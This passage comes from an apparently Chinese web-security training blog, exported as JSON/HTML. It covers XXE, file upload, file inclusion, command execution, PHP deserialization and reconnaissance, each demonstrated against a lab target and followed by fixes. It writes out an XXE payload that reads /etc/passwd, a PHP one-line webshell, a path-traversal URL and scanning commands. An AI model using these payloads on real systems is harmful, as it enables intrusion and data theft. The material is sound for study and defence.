class=\"string\">&quot;file:///etc/passwd&quot;</span>&gt;]&gt;</span><br><span class=\"line\">&lt;x&gt;&amp;garck;&lt;/x&gt;</span><br></pre></td></tr></table></figure>\n<h3 id><a href=\"#\" class=\"headerlink\" title></a></h3><p>提交后，可以看到前端返回了我们在xml中的DTD定义变量的值</p>\n<p>XML外部实体注入</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [</span><br><span class=\"line\">    &lt;!ENTITY hacker &quot;XXE hahaha&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure>\n<p>提交后，可以看到前端返回了我们在xml中的DTD定义变量的值</p>\n<p>接下来。我们可以去构造一个恶意的payload，通过外部实体引用从而去获取后台服务器的本地文件信息(注：外部引用可以支持http，file，ftp等协议。)</p>\n<p>提交后，页面显示了后台服务器的本地文件passwd的内容</p>\n<h3 id=\"常用利用方法\"><a href=\"#常用利用方法\" class=\"headerlink\" title=\"常用利用方法\"></a>常用利用方法</h3><p>1.类似于 file:&#x2F;&#x2F;xxx 的，很明显可以造成敏感数据泄露。</p>\n<p>2.可以利用 XXE 执行 SSRF 攻击。</p>\n<p>3.利用盲 XXE 将泄露数据外带；通过报错信息检索数据。</p>\n<p>4.XXE 与文件上传结合，造成 getshell。</p>\n<h3 id=\"修复方法\"><a href=\"#修复方法\" class=\"headerlink\" title=\"修复方法\"></a>修复方法</h3><p>1.过滤用户提交的XML数据，如：关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>\n<p>2.不允许XML中含有任何自己声明的DTD</p>\n<p>3.禁用外部实体</p>\n<h2 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h2><h3 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p>\n<h3 id=\"挖掘方法-1\"><a href=\"#挖掘方法-1\" class=\"headerlink\" title=\"挖掘方法\"></a>挖掘方法</h3><p>查看发现是前端限制</p>\n<p><img src=\"xLWn55v4ZSAjKfqhVM4-ieXr6j64cChRhf3jHsMz9k0.png\" alt=\"image\"></p>\n<p>将其去掉</p>\n<p>checkFileExt(this.value)</p>\n<p><a href=\"http://192.168.88.104:8088/vul/unsafeupload/uploads/1234.php?x=phpinfo();\">http://192.168.88.104:8088/vul/unsafeupload/uploads/1234.php?x=phpinfo();</a></p>\n<p>一句话木马：</p>\n<?php @eval(\\$\\_GET\\['x'\\]);?>\n\n\n\n<h3 id=\"常用利用方法-1\"><a href=\"#常用利用方法-1\" class=\"headerlink\" title=\"常用利用方法\"></a>常用利用方法</h3><p>直接上传后门，控制网站，得到web权限（网站服务器权限）。</p>\n<h3 id=\"修复方法-1\"><a href=\"#修复方法-1\" class=\"headerlink\" title=\"修复方法\"></a>修复方法</h3><p>1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p>\n<p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p>\n<p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p>\n<p>　　4、严格限制上传的文件路径。</p>\n<p>　　5、文件扩展名服务端白名单校验。</p>\n<p>　　6、文件内容服务端校验。</p>\n<p>　　7、上传文件重命名。</p>\n<p>　　8、隐藏上传文件路径。</p>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><h3 id=\"原理-2\"><a href=\"#原理-2\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>本地文件包含、远程文件包含</p>\n<p>本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p>\n<h3 id=\"挖掘方法-2\"><a href=\"#挖掘方法-2\" class=\"headerlink\" title=\"挖掘方法\"></a>挖掘方法</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/fileinclude/fi_local.php?filename=../../../../../etc/passwd&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n<h3 id=\"常用利用方法-2\"><a href=\"#常用利用方法-2\" class=\"headerlink\" title=\"常用利用方法\"></a>常用利用方法</h3><p>控制网站，得到web权限（网站服务器权限）。</p>\n<h3 id=\"修复方法-2\"><a href=\"#修复方法-2\" class=\"headerlink\" title=\"修复方法\"></a>修复方法</h3><p>1、严格检查变量是否已经初始化。</p>\n<p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现.&#x2F;和..&#x2F;等目录跳转符。</p>\n<p>　　3、严格检查文件包含函数中的参数是否外界可控。</p>\n<p>1.过滤各种.&#x2F;. ,http:&#x2F;&#x2F; ，https:&#x2F;&#x2F;</p>\n<p>3.通过白名单策略，仅允许包含运行指定的文件,其他的都禁止。</p>\n","categories":["原创培训课件"],"tags":["XXE","文件上传","文件包含"]},{"title":"day3-web安全基础四（下午：命令执行、反序列化）","url":"/2022/08/16/day3-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%9B%9B%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89/","content":"<h1 id=\"day3-web安全基础四（下午：命令执行、反序列化）\"><a href=\"#day3-web安全基础四（下午：命令执行、反序列化）\" class=\"headerlink\" title=\"day3-web安全基础四（下午：命令执行、反序列化）\"></a>day3-web安全基础四（下午：命令执行、反序列化）</h1><h2 id=\"命令-x2F-代码执行\"><a href=\"#命令-x2F-代码执行\" class=\"headerlink\" title=\"命令&#x2F;代码执行\"></a>命令&#x2F;代码执行</h2><p>原理</p>\n<p>命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。</p>\n<p>挖掘方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/rce/rce_ping.php</span></span><br></pre></td></tr></table></figure>\n<p>修复方法</p>\n<p>    1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p>\n<p>　　2、减少或不使用代码或命令执行函数</p>\n<p>　　3、客户端提交的变量在放入函数前进行检测</p>\n<p>　　4、减少或不使用危险函数</p>\n<h2 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h2><p>原理</p>\n<p>序列化：为了方便传输和存储数据，将要传输或者存储的对象进行序列化生成字节对象，传到持久化服务器上。</p>\n<p>反序列化：从内存中读取序列化后的字节对象，将其转换为所需对象。</p>\n<p>PHP序列化函数：serialize()</p>\n<p>反序列化函数：unserialize()</p>\n<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">常见的几个魔法函数:</span><br><span class=\"line\">        __construct()当一个对象创建时被调用</span><br><span class=\"line\"></span><br><span class=\"line\">        __destruct()当一个对象销毁时被调用</span><br><span class=\"line\"></span><br><span class=\"line\">        __toString()当一个对象被当作一个字符串使用</span><br><span class=\"line\"></span><br><span class=\"line\">        __sleep() 在对象在被序列化之前运行</span><br><span class=\"line\"></span><br><span class=\"line\">        __wakeup将在序列化之后立即被调用</span><br><span class=\"line\"></span><br><span class=\"line\">        漏洞举例:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">class</span> <span class=\"title class_\">S</span>&#123;</span><br><span class=\"line\">            <span class=\"type\">var</span> <span class=\"variable\">$test</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;pikachu&quot;</span>;</span><br><span class=\"line\">            function <span class=\"title function_\">__destruct</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">                echo $<span class=\"built_in\">this</span>-&gt;test;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $s = $_GET[<span class=\"string\">&#x27;test&#x27;</span>];</span><br><span class=\"line\">        <span class=\"meta\">@$unser</span> = unserialize($s);</span><br><span class=\"line\"></span><br><span class=\"line\">        payload:O:<span class=\"number\">1</span>:<span class=\"string\">&quot;S&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;test&quot;</span>;s:<span class=\"number\">29</span>:<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>挖掘方法</p>\n<h2 id=\"反序列化-1\"><a href=\"#反序列化-1\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h2><p><a href=\"https://c.runoob.com/compile/1/\">https://c.runoob.com/compile/1/</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">S</span>&#123;</span><br><span class=\"line\">            <span class=\"type\">var</span> <span class=\"variable\">$test</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;pikachu&quot;</span>;</span><br><span class=\"line\">            function <span class=\"title function_\">__destruct</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">                echo $<span class=\"built_in\">this</span>-&gt;test;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $s = $_GET[<span class=\"string\">&#x27;test&#x27;</span>];</span><br><span class=\"line\">        <span class=\"meta\">@$unser</span> = unserialize($s);</span><br></pre></td></tr></table></figure>\n<h3 id=\"序列化\"><a href=\"#序列化\" class=\"headerlink\" title=\"序列化\"></a>序列化</h3><p>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">S</span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">public</span> $test=<span class=\"string\">&quot;pikachu&quot;</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   $s=<span class=\"keyword\">new</span> <span class=\"title class_\">S</span>(); <span class=\"comment\">//创建一个对象</span></span><br><span class=\"line\">   serialize($s); <span class=\"comment\">//把这个对象进行序列化</span></span><br><span class=\"line\">   序列化后得到的结果是这个样子的:O:<span class=\"number\">1</span>:<span class=\"string\">&quot;S&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;test&quot;</span>;s:<span class=\"number\">7</span>:<span class=\"string\">&quot;pikachu&quot;</span>;&#125;</span><br><span class=\"line\">       O:代表object</span><br><span class=\"line\">       <span class=\"number\">1</span>:代表对象名字长度为一个字符</span><br><span class=\"line\">       S:对象的名称</span><br><span class=\"line\">       <span class=\"number\">1</span>:代表对象里面有一个变量</span><br><span class=\"line\">       s:数据类型</span><br><span class=\"line\">       <span class=\"number\">4</span>:变量名称的长度</span><br><span class=\"line\">       test:变量名称</span><br><span class=\"line\">       s:数据类型</span><br><span class=\"line\">       <span class=\"number\">7</span>:变量值的长度</span><br><span class=\"line\">       pikachu:变量值</span><br></pre></td></tr></table></figure>\n<h3 id=\"反序列化unserialize\"><a href=\"#反序列化unserialize\" class=\"headerlink\" title=\"反序列化unserialize()\"></a><strong>反序列化unserialize()</strong></h3><p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">$u=unserialize(<span class=\"string\">&quot;O:1:&quot;</span>S<span class=\"string\">&quot;:1:&#123;s:4:&quot;</span>test<span class=\"string\">&quot;;s:7:&quot;</span>pikachu<span class=\"string\">&quot;;&#125;&quot;</span>);</span><br><span class=\"line\">    echo $u-&gt;test; <span class=\"comment\">//得到的结果为pikachu</span></span><br></pre></td></tr></table></figure>\n<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">常见的几个魔法函数:</span><br><span class=\"line\">        __construct()当一个对象创建时被调用</span><br><span class=\"line\"></span><br><span class=\"line\">        __destruct()当一个对象销毁时被调用</span><br><span class=\"line\"></span><br><span class=\"line\">        __toString()当一个对象被当作一个字符串使用</span><br><span class=\"line\"></span><br><span class=\"line\">        __sleep() 在对象在被序列化之前运行</span><br><span class=\"line\"></span><br><span class=\"line\">        __wakeup将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>\n<h3 id=\"序列化和反序列化的演示\"><a href=\"#序列化和反序列化的演示\" class=\"headerlink\" title=\"序列化和反序列化的演示\"></a>序列化和反序列化的演示</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $test=<span class=\"string\">&quot;pikachu&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$s=<span class=\"keyword\">new</span> <span class=\"title class_\">A</span>();   <span class=\"comment\">//创建对象</span></span><br><span class=\"line\">$serdata=serialize($s);    <span class=\"comment\">//把对象进行序列化 </span></span><br><span class=\"line\">echo $serdata;</span><br><span class=\"line\">echo <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class=\"line\">$u=unserialize($serdata);   <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">echo $u-&gt;test;</span><br></pre></td></tr></table></figure>\n<p>运行后，可以看到，前面的字符串是序列化后的结果，而“<strong>pikachu</strong>”则是反序列化后得出的值。</p>\n<p><img src=\"OHgvPASdHt_22vipbxJBSyiKdHem9446mNCozW7IXNU.png\" alt=\"image\"></p>\n<p>在pikachu靶场中，随便输入内容提交，都是只显示出一句话</p>\n<p><img src=\"gcAs-KyGDO8pIBBUnZhu1Q5_hHZXfWBT7W0VUHo9DPE.png\" alt=\"image\"></p>\n<p>构造一个payload来获取到一个正确的序列化后的内容，然后把正确的内容进行提交，让后台对此内容进行反序列化，执行payload中的恶意JavaScript代码，从而获取到我们想要的信息。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">S</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $test=<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> <span class=\"title class_\">S</span>();</span><br><span class=\"line\">echo <span class=\"title function_\">serialize</span><span class=\"params\">($a)</span>;  <span class=\"comment\">//输入一个序列化后的内容</span></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>把得到的序列化好的内容复制到pikachu页面中进行提交，后台就会自动执行恶意的JavaScript代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:<span class=\"number\">1</span>:<span class=\"string\">&quot;S&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;test&quot;</span>;s:<span class=\"number\">29</span>:<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"查看后端源代码分析漏洞原因\"><a href=\"#查看后端源代码分析漏洞原因\" class=\"headerlink\" title=\"查看后端源代码分析漏洞原因\"></a>查看后端源代码分析漏洞原因</h3><p>后端中他定义了一个类，在类中定义了一个魔法方法__construct()，当这个类被创建时，它就会自动执行。</p>\n<p>而后台会去接收一个POST请求，然后对接收的数据进行反序列化，但因为后台没有对接收的数据做任何的过滤等安全措施，导致用户可以在前端进行逆向操作(就像我们前面演示的一样)，从而造成漏洞的产生！</p>\n<p>unser.php</p>\n<p><img src=\"CB5tMzAPKNgtiXgpRsN7AvCliv6JBhioAZNaeWma9tQ.png\" alt=\"image\"></p>\n<p><img src=\"ZceWRuf-oZ77E_J51hoO-OPAavzmHVF6027YhotBWZM.png\" alt=\"image\"></p>\n<p>修复方法</p>\n<p>1、对传入的对象进行严格的过滤检查</p>\n<p>2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p>\n","categories":["原创培训课件"],"tags":["反序列化","命令执行"]},{"title":"day4-信息收集技术（上午：外网信息收集、内网信息收集、漏洞分级）","url":"/2022/08/16/day4-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/","content":"<h1 id=\"day4-信息收集技术（上午：外网信息收集、内网信息收集、漏洞分级）\"><a href=\"#day4-信息收集技术（上午：外网信息收集、内网信息收集、漏洞分级）\" class=\"headerlink\" title=\"day4-信息收集技术（上午：外网信息收集、内网信息收集、漏洞分级）\"></a>day4-信息收集技术（上午：外网信息收集、内网信息收集、漏洞分级）</h1><h2 id=\"外网信息收集\"><a href=\"#外网信息收集\" class=\"headerlink\" title=\"外网信息收集\"></a>外网信息收集</h2><p>渗透的本质是信息收集，信息收集也叫做资产收集</p>\n<p>信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感&#x2F;目录文件、开放端口和中间件信息等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。</p>\n<p>目标主机的DNS信息、目标IP地址、子域名、旁站和C段、CMS类型、敏感目录、端口信息、操作系统版本、网站架构、漏洞信息、服务器与中间件信息、邮箱、人员、地址</p>\n<h3 id=\"域名\"><a href=\"#域名\" class=\"headerlink\" title=\"域名\"></a>域名</h3><h4 id=\"域名的信息\"><a href=\"#域名的信息\" class=\"headerlink\" title=\"域名的信息\"></a>域名的信息</h4><ol>\n<li>   whois查询</li>\n</ol>\n<p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等。</p>\n<p>站长之家域名WHOIS信息查询地址 <a href=\"http://whois.chinaz.com/\">http://whois.chinaz.com/</a></p>\n<p>爱站网域名WHOIS信息查询地址 <a href=\"https://whois.aizhan.com/\">https://whois.aizhan.com/</a></p>\n<p>腾讯云域名WHOIS信息查询地址 <a href=\"https://whois.cloud.tencent.com/\">https://whois.cloud.tencent.com/</a></p>\n<p>2.备案信息</p>\n<p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等）</p>\n<ol>\n<li><p>   天眼查 <a href=\"https://www.tianyancha.com/\">https://www.tianyancha.com/</a></p>\n</li>\n<li><p>   ICP备案查询网<a href=\"http://www.beianbeian.com/\">http://www.beianbeian.com/</a></p>\n</li>\n<li><p>   爱站备案查询<a href=\"https://icp.aizhan.com/\">https://icp.aizhan.com/</a></p>\n</li>\n</ol>\n<h4 id=\"子域名\"><a href=\"#子域名\" class=\"headerlink\" title=\"子域名\"></a>子域名</h4><p>收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。</p>\n<p>子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城，其他管理系统，网站管理后台也有可能出现子域名中。</p>\n<p>查找目标域名信息的方法有：</p>\n<ol>\n<li><p>   FOFA title&#x3D;”公司名称”</p>\n</li>\n<li><p>   百度 intitle&#x3D;公司名称</p>\n</li>\n<li><p>   Google intitle&#x3D;公司名称 </p>\n</li>\n<li><p>   站长之家，直接搜索名称或者网站域名即可查看相关信息：</p>\n</li>\n</ol>\n<p><a href=\"http://tool.chinaz.com/\">http://tool.chinaz.com/</a></p>\n<ol start=\"5\">\n<li>   钟馗之眼 site&#x3D;域名</li>\n</ol>\n<p><a href=\"https://www.zoomeye.org/\">https://www.zoomeye.org/</a></p>\n<p>6.子域名在线查询1</p>\n<p><a href=\"https://phpinfo.me/domain/\">https://phpinfo.me/domain/</a></p>\n<p><a href=\"https://www.t1h2ua.cn/tools/\">https://www.t1h2ua.cn/tools/</a></p>\n<p><a href=\"https://site.ip138.com/moonsec.com/domain.htm\">https://site.ip138.com/moonsec.com/domain.htm</a></p>\n<p>7.Layer子域名挖掘机</p>\n<h3 id=\"IP\"><a href=\"#IP\" class=\"headerlink\" title=\"IP\"></a>IP</h3><p>如果目标网站使用了CDN，使用了cdn真实的ip会被隐藏，如果要查找真实的服务器就必须获取真实的ip</p>\n<p>注意：很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实ip也是一种途径。</p>\n<ol>\n<li>   多地ping确认是否使用CDN</li>\n</ol>\n<p><a href=\"http://ping.chinaz.com/\">http://ping.chinaz.com/</a></p>\n<p>2.phpinfo</p>\n<p>如果目标网站存在phpinfo泄露等，可以在phpinfo中的SERVER_ADDR或_SERVER[“SERVER_ADDR”]找到真实ip</p>\n<p>3.查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录</p>\n<p><a href=\"https://dnsdb.io/zh-cn/%E2%80%94%E2%80%94DNS%E6%9F%A5%E8%AF%A2\">https://dnsdb.io/zh-cn/——DNS查询</a></p>\n<p><a href=\"https://x.threatbook.cn/%E2%80%94%E2%80%94%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF\">https://x.threatbook.cn/——微步在线</a></p>\n<p><a href=\"http://toolbar.netcraft.com/site/_report?url=\">http://toolbar.netcraft.com/site\\_report?url=</a> ——在线域名信息查询</p>\n<p><a href=\"http://viewdns.info/\">http://viewdns.info/</a> ——DNS、IP等查询</p>\n<p>4.查询子域名</p>\n<p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p>\n<p><a href=\"https://dnsdb.io/zh-cn/\">https://dnsdb.io/zh-cn/</a></p>\n<p>只需输入baidu.com type:A就能收集百度的子域名和ip了</p>\n<p>5.网站邮件头信息</p>\n<p>比如说，邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>\n<h3 id=\"端口\"><a href=\"#端口\" class=\"headerlink\" title=\"端口\"></a>端口</h3><p>部分常见端口</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">FTP\t<span class=\"number\">20</span>\t</span><br><span class=\"line\">FTP\t<span class=\"number\">21</span>\t</span><br><span class=\"line\">SSH\t<span class=\"number\">22</span>\t</span><br><span class=\"line\">Telnet\t<span class=\"number\">23</span>\t</span><br><span class=\"line\">SMTP\t<span class=\"number\">25</span>\t</span><br><span class=\"line\">DNS\t<span class=\"number\">53</span>\t</span><br><span class=\"line\">HTTP\t<span class=\"number\">80</span>\t</span><br><span class=\"line\">POP3\t<span class=\"number\">110</span>\t</span><br><span class=\"line\">HTTPS\t<span class=\"number\">443</span>\t</span><br><span class=\"line\">sql server\t<span class=\"number\">1433</span>\t</span><br><span class=\"line\">Oracle\t<span class=\"number\">1521</span>\t</span><br><span class=\"line\">NFS\t<span class=\"number\">2049</span>\t</span><br><span class=\"line\">MySQL\t<span class=\"number\">3306</span>\t</span><br><span class=\"line\">WIN2003远程登录\t<span class=\"number\">3389</span>\t</span><br><span class=\"line\">QQ·\t<span class=\"number\">4000</span>\t</span><br><span class=\"line\">redis·\t<span class=\"number\">6379</span>\t数据库</span><br><span class=\"line\">WebLogic\t<span class=\"number\">7001</span>\t</span><br><span class=\"line\">Wingate\t<span class=\"number\">8010</span></span><br><span class=\"line\">TOMCAT\t<span class=\"number\">8080</span>\tWWW代理开放此端口</span><br></pre></td></tr></table></figure>\n<p>nmap</p>\n<p>例如：nmap -p 80,443,8000,8080 -Pn 192.168.1.0&#x2F;24</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>、-Pn 跳过主机发现，视为所有的主机都在线</span><br><span class=\"line\"><span class=\"number\">2</span>、sn 只做ping扫描不做端口扫描</span><br><span class=\"line\"><span class=\"number\">3</span>、sT\\A\\W\\M 不同的扫描端口，进行扫描</span><br><span class=\"line\"><span class=\"number\">4</span>、-p 指定端口进行扫描 --exclude-ports：排除端口进行扫描</span><br><span class=\"line\"><span class=\"number\">5</span>、-sV 探测系统的版本</span><br><span class=\"line\">–version-intensity：设置相关的程度，详细级别，<span class=\"number\">0</span>~<span class=\"number\">9</span> 越高越详细</span><br><span class=\"line\">–version-trace：打印详细的版本扫描过程</span><br><span class=\"line\"><span class=\"number\">6</span>、脚本扫描</span><br><span class=\"line\">–scri= ：指定对应的脚本名称</span><br><span class=\"line\"><span class=\"number\">7</span>、O：激活系统的探测</span><br><span class=\"line\">–osscan-limit：只对开放端口的有效主机进行系统的探测</span><br><span class=\"line\"><span class=\"number\">8</span>、-T&lt;<span class=\"number\">0</span>-<span class=\"number\">5</span>&gt;:时间模板，越大速度越快</span><br><span class=\"line\"><span class=\"number\">9</span>、-<span class=\"number\">6</span>：使能IPV6探测</span><br><span class=\"line\"><span class=\"number\">10</span>、-A：使能系统探测、版本检测、脚本扫描、路由追踪</span><br><span class=\"line\"><span class=\"number\">11</span>、-V：打印版本号</span><br><span class=\"line\"><span class=\"number\">12</span>、-v：增加输出的详细程度</span><br></pre></td></tr></table></figure>\n<p>masscan</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">masscan -p <span class=\"number\">0</span>-<span class=\"number\">65535</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.100</span> --rate=<span class=\"number\">10000</span></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"敏感信息\"><a href=\"#敏感信息\" class=\"headerlink\" title=\"敏感信息\"></a>敏感信息</h3><p>扫描敏感目录需要强大的字典，需要平时积累，拥有强大的字典能够更高效地找出网站的管理后台，敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等</p>\n<ol>\n<li>   御剑</li>\n</ol>\n<p>2.  7kbstorm</p>\n<p>3.dirsearch</p>\n<p>4.gobuster</p>\n<p>结果展示</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> robots.txt</span><br><span class=\"line\"><span class=\"number\">2.</span> crossdomin.xml</span><br><span class=\"line\"><span class=\"number\">3.</span> sitemap.xml</span><br><span class=\"line\"><span class=\"number\">4.</span> 后台目录</span><br><span class=\"line\"><span class=\"number\">5.</span> 网站安装包</span><br><span class=\"line\"><span class=\"number\">6.</span> 网站上传目录</span><br><span class=\"line\"><span class=\"number\">7.</span> mysql管理页面</span><br><span class=\"line\"><span class=\"number\">8.</span> phpinfo</span><br><span class=\"line\"><span class=\"number\">9.</span> 网站文本编辑器</span><br><span class=\"line\"><span class=\"number\">10.</span> 测试文件</span><br><span class=\"line\"><span class=\"number\">11.</span> 网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</span><br><span class=\"line\"><span class=\"number\">12.</span> DS_Store 文件</span><br><span class=\"line\"><span class=\"number\">13.</span> vim编辑器备份文件(.swp)</span><br><span class=\"line\"><span class=\"number\">14.</span> WEB—INF/web.xml文件</span><br><span class=\"line\"><span class=\"number\">15</span> .git</span><br><span class=\"line\"><span class=\"number\">16</span> .svn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">网页备份信息</span><br><span class=\"line\">config.php</span><br><span class=\"line\">config.php~</span><br><span class=\"line\">config.php.bak</span><br><span class=\"line\">conig.php.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>谷歌语法：</p>\n<p>site:域名</p>\n<p>inurl: url中存在的关键字网页</p>\n<p>intext：网页正文中的关键词</p>\n<p>filetype:指定文件类型</p>\n<h3 id=\"CMS识别\"><a href=\"#CMS识别\" class=\"headerlink\" title=\"CMS识别\"></a>CMS识别</h3><ol>\n<li>   云悉</li>\n</ol>\n<p><a href=\"http://www.yunsee.cn/info.html\">http://www.yunsee.cn/info.html</a></p>\n<ol start=\"2\">\n<li>   潮汐指纹</li>\n</ol>\n<p><a href=\"http://finger.tidesec.net/\">http://finger.tidesec.net/</a></p>\n<p>3.御剑cms识别</p>\n<h2 id=\"内网信息收集\"><a href=\"#内网信息收集\" class=\"headerlink\" 